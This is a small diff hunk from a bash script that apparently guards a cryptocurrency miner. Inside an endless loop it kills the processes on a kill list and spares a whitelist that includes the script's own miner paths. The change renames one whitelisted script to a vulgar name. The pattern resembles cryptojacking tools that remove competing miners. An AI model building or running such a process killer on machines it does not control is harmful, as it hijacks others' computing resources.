@@ -10,7 +10,7 @@ OWN_MINER_PATHS=(
 )
 
 # Real running commands or scripts you want to whitelist
-WHITELIST=("settings.json" "frog.sh" "nginx" "${OWN_MINER_PATHS[@]}")
+WHITELIST=("settings.json" "dick.sh" "nginx" "${OWN_MINER_PATHS[@]}")
 
 while true; do
     for proc in "${KILL_LIST[@]}"; do
